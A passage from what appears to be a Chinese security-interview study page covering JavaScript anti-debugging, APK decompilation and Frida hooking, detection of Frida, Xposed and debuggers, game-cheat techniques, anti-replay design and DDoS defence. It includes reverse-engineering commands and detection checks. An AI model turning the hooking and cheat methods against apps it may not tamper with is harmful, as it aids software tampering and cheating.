class="line"><span class="keyword">var</span> a = <span class="string">&quot;secret&quot;</span>; <span class="comment">// 原代码</span></span><br><span class="line"><span class="keyword">var</span> _0x1a3b4 = <span class="string">&quot;secret&quot;</span>; <span class="comment">// 混淆后</span></span><br></pre></td></tr></table></figure></li></ul></li><li><strong>字符串加密</strong>：<ul><li>使用 <strong>RC4</strong> 或 <strong>Base64</strong> 编码保护字符串：<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="title function_">atob</span>(<span class="string">&quot;c2VjcmV0&quot;</span>); <span class="comment">// &quot;secret&quot;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><strong>Unicode 转换</strong>：<ul><li>代码转换为 Unicode 表示：<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;\u0068\u0065\u006c\u006c\u006f&quot;</span>; <span class="comment">// &quot;hello&quot;</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><h2 id="反调试技术：1-禁用开发者工具：-监听-DevTools-打开状态，触发-debugger：-2-拦截-console-调试：-禁用-console-：-3-代码自毁机制：-当代码检测到-DevTools-运行时，修改关键变量或终止执行："><a href="#反调试技术：1-禁用开发者工具：-监听-DevTools-打开状态，触发-debugger：-2-拦截-console-调试：-禁用-console-：-3-代码自毁机制：-当代码检测到-DevTools-运行时，修改关键变量或终止执行：" class="headerlink" title="反调试技术：1. 禁用开发者工具：   - 监听 DevTools 打开状态，触发 debugger：     2. 拦截 console 调试：   - 禁用 console.*：     3. 代码自毁机制：   - 当代码检测到 DevTools 运行时，修改关键变量或终止执行：     "></a><strong>反调试技术</strong>：<br>1. <strong>禁用开发者工具</strong>：<br>   - 监听 <code>DevTools</code> 打开状态，触发 <code>debugger</code>：<br>     <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Checking DevTools...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">outerHeight</span> - <span class="variable language_">window</span>.<span class="property">innerHeight</span> &gt; <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">reload</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><br>2. <strong>拦截 <code>console</code> 调试</strong>：<br>   - 禁用 <code>console.*</code>：<br>     <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="property">log</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;;</span><br></pre></td></tr></table></figure><br>3. <strong>代码自毁机制</strong>：<br>   - 当代码检测到 <code>DevTools</code> 运行时，修改关键变量或终止执行：<br>     <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">navigator</span>.<span class="property">webdriver</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;Debugger detected!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></h2><h3 id="如何实现当前页面-location-href-改变后，仍然能执行之前的-JavaScript？"><a href="#如何实现当前页面-location-href-改变后，仍然能执行之前的-JavaScript？" class="headerlink" title="如何实现当前页面 location.href 改变后，仍然能执行之前的 JavaScript？"></a><strong>如何实现当前页面 <code>location.href</code> 改变后，仍然能执行之前的 JavaScript？</strong></h3><h2 id="方法：1-使用-setTimeout-执行延迟任务：-JavaScript-的-setTimeout-方法不会被-location-href-影响，可用于延迟执行代码：-2-使用-window-onbeforeunload-监听跳转：-在页面跳转前执行代码：-3-Service-Worker-方式：-通过-Service-Worker-持续运行-JS-逻辑，即使页面跳转："><a href="#方法：1-使用-setTimeout-执行延迟任务：-JavaScript-的-setTimeout-方法不会被-location-href-影响，可用于延迟执行代码：-2-使用-window-onbeforeunload-监听跳转：-在页面跳转前执行代码：-3-Service-Worker-方式：-通过-Service-Worker-持续运行-JS-逻辑，即使页面跳转：" class="headerlink" title="方法：1. 使用 setTimeout 执行延迟任务：   - JavaScript 的 setTimeout 方法不会被 location.href 影响，可用于延迟执行代码：     2. 使用 window.onbeforeunload 监听跳转：   - 在页面跳转前执行代码：     3. Service Worker 方式：   - 通过 Service Worker 持续运行 JS 逻辑，即使页面跳转：     "></a><strong>方法</strong>：<br>1. <strong>使用 <code>setTimeout</code> 执行延迟任务</strong>：<br>   - JavaScript 的 <code>setTimeout</code> 方法不会被 <code>location.href</code> 影响，可用于延迟执行代码：<br>     <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;This runs even after page change!&quot;</span>);</span><br><span class="line">&#125;, <span class="number">3000</span>);</span><br><span class="line">location.<span class="property">href</span> = <span class="string">&quot;https://example.com&quot;</span>;</span><br></pre></td></tr></table></figure><br>2. <strong>使用 <code>window.onbeforeunload</code> 监听跳转</strong>：<br>   - 在页面跳转前执行代码：<br>     <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onbeforeunload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Page is leaving...&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Are you sure?&quot;</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br>3. <strong>Service Worker 方式</strong>：<br>   - 通过 <code>Service Worker</code> 持续运行 JS 逻辑，即使页面跳转：<br>     <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">navigator.<span class="property">serviceWorker</span>.<span class="title function_">register</span>(<span class="string">&#x27;/worker.js&#x27;</span>).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Service Worker Registered!&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></h2><h3 id="APK-反编译有哪几种路径，代表工具有哪些？"><a href="#APK-反编译有哪几种路径，代表工具有哪些？" class="headerlink" title="APK 反编译有哪几种路径，代表工具有哪些？"></a><strong>APK 反编译有哪几种路径，代表工具有哪些？</strong></h3><p><strong>反编译路径</strong>：</p><ol><li><p><strong>DEX 反编译（Dalvik Executable）</strong>：</p><ul><li>将 <code>classes.dex</code> 还原为 Java 代码：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jadx -d output/ app.apk</span><br></pre></td></tr></table></figure></li><li><strong>工具</strong>：<code>JADX</code>、<code>dex2jar</code>、<code>Bytecode Viewer</code></li></ul></li><li><p><strong>资源文件提取</strong>：</p><ul><li>获取 <code>AndroidManifest.xml</code>、<code>res</code> 目录内容：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d app.apk -o output/</span><br></pre></td></tr></table></figure></li><li><strong>工具</strong>：<code>Apktool</code></li></ul></li><li><p><strong>动态调试（Hook 技术）</strong>：</p><ul><li>通过 <code>Frida</code>、<code>Xposed</code> 在运行时修改应用行为：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -n target_app -e <span class="string">&quot;Java.perform(() =&gt; &#123; console.log(&#x27;Hooked!&#x27;); &#125;)&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>工具</strong>：<code>Frida</code>、<code>Xposed</code></li></ul></li></ol><h2 id="防御措施：-开启-ProGuard-进行代码混淆：-使用-Native-C-代码保护关键逻辑，避免-Java-层被轻易反编译。"><a href="#防御措施：-开启-ProGuard-进行代码混淆：-使用-Native-C-代码保护关键逻辑，避免-Java-层被轻易反编译。" class="headerlink" title="防御措施：- 开启 ProGuard 进行代码混淆：  - 使用 Native C++ 代码保护关键逻辑，避免 Java 层被轻易反编译。"></a><strong>防御措施</strong>：<br>- <strong>开启 ProGuard</strong> 进行代码混淆：<br>  <figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">minifyEnabled <span class="keyword">true</span></span><br><span class="line">proguardFiles getDefaultProguardFile(<span class="string">&#x27;proguard-android-optimize.txt&#x27;</span>), <span class="string">&#x27;proguard-rules.pro&#x27;</span></span><br></pre></td></tr></table></figure><br>- <strong>使用 Native C++ 代码保护关键逻辑</strong>，避免 Java 层被轻易反编译。</h2><h3 id="App-自检升级场景下会存在哪些风险？"><a href="#App-自检升级场景下会存在哪些风险？" class="headerlink" title="App 自检升级场景下会存在哪些风险？"></a><strong>App 自检升级场景下会存在哪些风险？</strong></h3><p><strong>主要风险</strong>：</p><ol><li><strong>中间人攻击（MITM）</strong>：<ul><li>升级包下载过程中若未使用 HTTPS，攻击者可篡改文件。</li></ul></li><li><strong>伪造更新包</strong>：<ul><li>服务器未进行签名校验，攻击者可伪造更新包，执行恶意代码。</li></ul></li><li><strong>权限提升</strong>：<ul><li>更新过程中若涉及动态加载 <code>dex</code> 或 <code>so</code>，可能被滥用实现远程代码执行（RCE）。</li></ul></li><li><strong>更新劫持</strong>：<ul><li>低版本系统可能被 <code>app hijacking</code> 攻击，导致跳转到恶意应用下载页面。</li></ul></li></ol><h2 id="防护措施：-强制使用-HTTPS-进行更新包传输，防止流量篡改。-签名校验，更新包需进行-SHA256-校验：-完整性检查，校验-AndroidManifest-xml-及-dex，防止动态加载恶意代码。"><a href="#防护措施：-强制使用-HTTPS-进行更新包传输，防止流量篡改。-签名校验，更新包需进行-SHA256-校验：-完整性检查，校验-AndroidManifest-xml-及-dex，防止动态加载恶意代码。" class="headerlink" title="防护措施：- 强制使用 HTTPS 进行更新包传输，防止流量篡改。- 签名校验，更新包需进行 SHA256 校验：  - 完整性检查，校验 AndroidManifest.xml 及 dex，防止动态加载恶意代码。"></a><strong>防护措施</strong>：<br>- <strong>强制使用 HTTPS</strong> 进行更新包传输，防止流量篡改。<br>- <strong>签名校验</strong>，更新包需进行 <strong>SHA256 校验</strong>：<br>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;SHA-256&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] digest = md.digest(fileBytes);</span><br></pre></td></tr></table></figure><br>- <strong>完整性检查</strong>，校验 <code>AndroidManifest.xml</code> 及 <code>dex</code>，防止动态加载恶意代码。</h2><h3 id="如何设计一套通信机制，能够保证传输过程中的完整性、不可抵赖性以及防止重放？"><a href="#如何设计一套通信机制，能够保证传输过程中的完整性、不可抵赖性以及防止重放？" class="headerlink" title="如何设计一套通信机制，能够保证传输过程中的完整性、不可抵赖性以及防止重放？"></a><strong>如何设计一套通信机制，能够保证传输过程中的完整性、不可抵赖性以及防止重放？</strong></h3><h2 id="设计原则：1-完整性：-采用-HMAC-SHA256-签名，确保消息未被篡改：-2-不可抵赖性：-使用-RSA-签名-确保消息来源可信：-3-防止重放攻击：-采用-时间戳-随机数（nonce），确保每次请求唯一：-服务器端存储-nonce，避免相同请求重复提交。"><a href="#设计原则：1-完整性：-采用-HMAC-SHA256-签名，确保消息未被篡改：-2-不可抵赖性：-使用-RSA-签名-确保消息来源可信：-3-防止重放攻击：-采用-时间戳-随机数（nonce），确保每次请求唯一：-服务器端存储-nonce，避免相同请求重复提交。" class="headerlink" title="设计原则：1. 完整性：   - 采用 HMAC-SHA256 签名，确保消息未被篡改：     2. 不可抵赖性：   - 使用 RSA 签名 确保消息来源可信：     3. 防止重放攻击：   - 采用 时间戳 + 随机数（nonce），确保每次请求唯一：        - 服务器端存储 nonce，避免相同请求重复提交。"></a><strong>设计原则</strong>：<br>1. <strong>完整性</strong>：<br>   - 采用 <strong>HMAC-SHA256 签名</strong>，确保消息未被篡改：<br>     <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Mac</span> <span class="variable">mac</span> <span class="operator">=</span> Mac.getInstance(<span class="string">&quot;HmacSHA256&quot;</span>);</span><br><span class="line">mac.init(<span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(secretKey.getBytes(), <span class="string">&quot;HmacSHA256&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[] hash = mac.doFinal(message.getBytes());</span><br></pre></td></tr></table></figure><br>2. <strong>不可抵赖性</strong>：<br>   - 使用 <strong>RSA 签名</strong> 确保消息来源可信：<br>     <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Signature</span> <span class="variable">sign</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;SHA256withRSA&quot;</span>);</span><br><span class="line">sign.initSign(privateKey);</span><br><span class="line">sign.update(message.getBytes());</span><br><span class="line"><span class="type">byte</span>[] signature = sign.sign();</span><br></pre></td></tr></table></figure><br>3. <strong>防止重放攻击</strong>：<br>   - 采用 <strong>时间戳 + 随机数（nonce）</strong>，确保每次请求唯一：<br>     <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1700000000</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;nonce&quot;</span><span class="punctuation">:</span> <span class="string">&quot;random-uuid&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;signature&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hmac_signature&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>   - 服务器端存储 <code>nonce</code>，避免相同请求重复提交。</h2><h3 id="如何进行实体检测？"><a href="#如何进行实体检测？" class="headerlink" title="如何进行实体检测？"></a><strong>如何进行实体检测？</strong></h3><p><strong>实体检测方法</strong>：</p><ol><li><strong>基于指纹识别</strong>：<ul><li>通过 <strong>设备 ID、MAC 地址、IMEI</strong> 进行唯一性检测。</li></ul></li><li><strong>基于地理位置</strong>：<ul><li>结合 GPS、WiFi 位置数据验证实体存在性。</li></ul></li><li><strong>基于行为分析</strong>：<ul><li>通过 <strong>鼠标移动轨迹、打字节奏</strong> 识别真实用户 vs 机器人。</li></ul></li></ol><h2 id="安全措施：-避免依赖-单一标识符，综合多个数据源进行验证。-采用-生物识别（指纹、人脸）增强认证安全性。"><a href="#安全措施：-避免依赖-单一标识符，综合多个数据源进行验证。-采用-生物识别（指纹、人脸）增强认证安全性。" class="headerlink" title="安全措施：- 避免依赖 单一标识符，综合多个数据源进行验证。- 采用 生物识别（指纹、人脸）增强认证安全性。"></a><strong>安全措施</strong>：<br>- 避免依赖 <strong>单一标识符</strong>，综合多个数据源进行验证。<br>- 采用 <strong>生物识别</strong>（指纹、人脸）增强认证安全性。</h2><h3 id="常见的调试方法和检测方法？"><a href="#常见的调试方法和检测方法？" class="headerlink" title="常见的调试方法和检测方法？"></a><strong>常见的调试方法和检测方法？</strong></h3><p><strong>常见调试方法</strong>：</p><ol><li><strong>Logcat 调试</strong>：<ul><li>通过 <code>adb logcat</code> 查看应用日志。</li></ul></li><li><strong>动态 Hook</strong>：<ul><li>通过 <code>Frida</code> 或 <code>Xposed</code> 修改应用逻辑：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -n target_app -e <span class="string">&quot;Java.perform(() =&gt; &#123; console.log(&#x27;Hooked!&#x27;); &#125;)&quot;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><strong>Smali 逆向修改</strong>：<ul><li>反编译 <code>apk</code> 并修改 <code>smali</code> 代码：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apktool d app.apk</span><br><span class="line">vim smali/com/example/MainActivity.smali</span><br></pre></td></tr></table></figure></li></ul></li></ol><p><strong>调试检测方法</strong>：</p><ul><li>**检测 <code>TracerPid</code>**：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;/proc/self/status&quot;</span>));</span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (line.contains(<span class="string">&quot;TracerPid&quot;</span>) &amp;&amp; !line.endsWith(<span class="string">&quot;\t0&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Debugging detected!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>检测 <code>ptrace</code> 进程</strong>：<ul><li>在 <code>Android</code> 设备上，<code>ptrace</code> 只能被一个进程附加，利用此特性可检测调试。</li></ul></li></ul><hr><h3 id="如何防止-Frida、Xposed-等注入攻击？"><a href="#如何防止-Frida、Xposed-等注入攻击？" class="headerlink" title="如何防止 Frida、Xposed 等注入攻击？"></a><strong>如何防止 Frida、Xposed 等注入攻击？</strong></h3><h2 id="防御方法：1-检测-Frida-进程：-通过-proc-net-tcp-检测-Frida-监听端口：-2-Xposed-Hook-检测：-检测-XposedBridge-jar-是否存在：-3-SELinux-强制模式：-运行-getenforce-命令，确保-SELinux-处于-Enforcing-模式。"><a href="#防御方法：1-检测-Frida-进程：-通过-proc-net-tcp-检测-Frida-监听端口：-2-Xposed-Hook-检测：-检测-XposedBridge-jar-是否存在：-3-SELinux-强制模式：-运行-getenforce-命令，确保-SELinux-处于-Enforcing-模式。" class="headerlink" title="防御方法：1. 检测 Frida 进程：   - 通过 /proc/net/tcp 检测 Frida 监听端口：     2. Xposed Hook 检测：   - 检测 XposedBridge.jar 是否存在：     3. SELinux 强制模式：   - 运行 getenforce 命令，确保 SELinux 处于 Enforcing 模式。"></a><strong>防御方法</strong>：<br>1. <strong>检测 Frida 进程</strong>：<br>   - 通过 <code>/proc/net/tcp</code> 检测 Frida 监听端口：<br>     <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;netstat -an&quot;</span>);</span><br></pre></td></tr></table></figure><br>2. <strong>Xposed Hook 检测</strong>：<br>   - 检测 <code>XposedBridge.jar</code> 是否存在：<br>     <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">xposed</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/system/framework/XposedBridge.jar&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (xposed.exists()) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Xposed detected!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>3. <strong>SELinux 强制模式</strong>：<br>   - 运行 <code>getenforce</code> 命令，确保 <code>SELinux</code> 处于 <code>Enforcing</code> 模式。</h2><h3 id="如何防止当前设备的数据拷贝到其他设备？"><a href="#如何防止当前设备的数据拷贝到其他设备？" class="headerlink" title="如何防止当前设备的数据拷贝到其他设备？"></a><strong>如何防止当前设备的数据拷贝到其他设备？</strong></h3><h2 id="防御措施：1-文件权限控制：-Android-限制文件访问：-2-设备绑定机制：-结合-Device-ID-用户-ID-进行数据绑定：-3-阻止-ADB-访问：-监听-adb-连接状态："><a href="#防御措施：1-文件权限控制：-Android-限制文件访问：-2-设备绑定机制：-结合-Device-ID-用户-ID-进行数据绑定：-3-阻止-ADB-访问：-监听-adb-连接状态：" class="headerlink" title="防御措施：1. 文件权限控制：   - Android 限制文件访问：     2. 设备绑定机制：   - 结合 Device ID + 用户 ID 进行数据绑定：     3. 阻止 ADB 访问：   - 监听 adb 连接状态：     "></a><strong>防御措施</strong>：<br>1. <strong>文件权限控制</strong>：<br>   - Android 限制文件访问：<br>     <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), <span class="string">&quot;data.txt&quot;</span>);</span><br><span class="line">file.setReadable(<span class="literal">false</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><br>2. <strong>设备绑定机制</strong>：<br>   - 结合 <code>Device ID + 用户 ID</code> 进行数据绑定：<br>     <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;device_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;abcd1234&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;user_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user5678&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>3. <strong>阻止 ADB 访问</strong>：<br>   - 监听 <code>adb</code> 连接状态：<br>     <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">adbStatus</span> <span class="operator">=</span> Settings.Global.getString(getContentResolver(), Settings.Global.ADB_ENABLED);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;1&quot;</span>.equals(adbStatus)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;ADB detected!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></h2><h3 id="外挂有几种类型的实现方式？"><a href="#外挂有几种类型的实现方式？" class="headerlink" title="外挂有几种类型的实现方式？"></a><strong>外挂有几种类型的实现方式？</strong></h3><p><strong>外挂类型</strong>：</p><ol><li><strong>修改游戏内存</strong>：<ul><li>通过 <code>Frida</code> 或 <code>Cheat Engine</code> 修改游戏数据。</li></ul></li><li><strong>注入 DLL</strong>：<ul><li>在 <code>Windows</code> 或 <code>Android</code> 上，攻击者可向游戏进程注入动态库 (<code>.dll</code> 或 <code>.so</code>)。</li></ul></li><li><strong>模拟点击</strong>：<ul><li>通过 <code>Auto.js</code> 或 <code>ADB</code> 自动化点击：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell input tap 500 500</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>网络封包修改</strong>：<ul><li>通过 <code>Burp Suite</code> 截取 HTTP 请求，修改游戏数据包。</li></ul></li></ol><h2 id="防御措施：-检测内存修改，启用-Integrity-Check。-使用服务器验证关键数据，避免客户端篡改。"><a href="#防御措施：-检测内存修改，启用-Integrity-Check。-使用服务器验证关键数据，避免客户端篡改。" class="headerlink" title="防御措施：- 检测内存修改，启用 Integrity Check。- 使用服务器验证关键数据，避免客户端篡改。"></a><strong>防御措施</strong>：<br>- <strong>检测内存修改</strong>，启用 <strong>Integrity Check</strong>。<br>- <strong>使用服务器验证关键数据</strong>，避免客户端篡改。</h2><h3 id="如何避免未经用户授权获取权限？"><a href="#如何避免未经用户授权获取权限？" class="headerlink" title="如何避免未经用户授权获取权限？"></a><strong>如何避免未经用户授权获取权限？</strong></h3><p><strong>防御策略</strong>：</p><ol><li><strong>权限最小化原则</strong>：<ul><li>仅申请必要权限，避免用户警觉：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.CAMERA&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><strong>动态权限申请</strong>：<ul><li>运行时请求权限：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ContextCompat.checkSelfPermission(<span class="built_in">this</span>, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">    ActivityCompat.requestPermissions(<span class="built_in">this</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;Manifest.permission.READ_CONTACTS&#125;, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>权限使用透明化</strong>：<ul><li>在 UI 提示用户权限用途，增强信任感。</li></ul></li></ol><h2 id="基础设施安全岗"><a href="#基础设施安全岗" class="headerlink" title="基础设施安全岗"></a>基础设施安全岗</h2><h3 id="DDoS-CC-如何有效防御与应急？"><a href="#DDoS-CC-如何有效防御与应急？" class="headerlink" title="DDoS&#x2F;CC 如何有效防御与应急？"></a><strong>DDoS&#x2F;CC 如何有效防御与应急？</strong></h3><p><strong>防御措施</strong>：</p><ol><li><p><strong>基础防护</strong>：</p><ul><li>启用 <strong>WAF（Web 应用防火墙）</strong>，过滤恶意流量。</li><li>限制 <strong>同一 IP 访问频率</strong>，防止 CC 攻击：<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">limit_req_zone</span> <span class="variable">$binary_remote_addr</span> zone=one:<span class="number">10m</span> rate=5r/s;</span><br></pre></td></tr></table></figure></li><li>启用 <strong>CDN</strong>（如 Cloudflare）缓解攻击。</li></ul></li><li><p><strong>高级防护</strong>：</p><ul><li>采用 <strong>流量清洗</strong>（如阿里云 DDoS 防护）。</li><li>配置 <strong>黑洞路由</strong>，丢弃异常流量。</li></ul></li></ol><h2 id="应急方案：-立即封禁攻击-IP：-切换备用服务器，防止业务中断。"><a href="#应急方案：-立即封禁攻击-IP：-切换备用服务器，防止业务中断。" class="headerlink" title="应急方案：- 立即封禁攻击 IP：  - 切换备用服务器，防止业务中断。"></a><strong>应急方案</strong>：<br>- 立即封禁攻击 IP：<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -s &lt;malicious_ip&gt; -j DROP</span><br></pre></td></tr></table></figure><br>- 切换备用服务器，防止业务中断。</h2><h3 id="如何对网络区域进行划分？"><a href="#如何对网络区域进行划分？" class="headerlink" title="如何对网络区域进行划分？"></a><strong>如何对网络区域进行划分？</strong></h3><p><strong>网络分区原则</strong>：</p><ol><li><p><strong>按照安全等级划分</strong>：</p><ul><li><strong>DMZ（非军事区）</strong>：对外暴露的服务（如 Web 服务器）。</li><li><strong>内部网络（LAN）</strong>：企业内部系统（如数据库、文件服务器）。</li><li><strong>隔离区</strong>：存放敏感数据，限制访问权限。</li></ul></li><li><p><strong>VLAN（虚拟局域网）</strong>：</p><ul><li>使用 <strong>VLAN</strong> 进行逻辑隔离，防止广播风暴。</li></ul></li></ol><hr><h3 id="经典网络与-VPC-的优势"><a href="#经典网络与-VPC-的优势" class="headerlink" title="经典网络与 VPC 的优势"></a><strong>经典网络与 VPC 的优势</strong></h3><table><thead><tr><th><strong>对比项</strong></th><th><strong>经典网络</strong></th><th><strong>VPC（Virtual Private 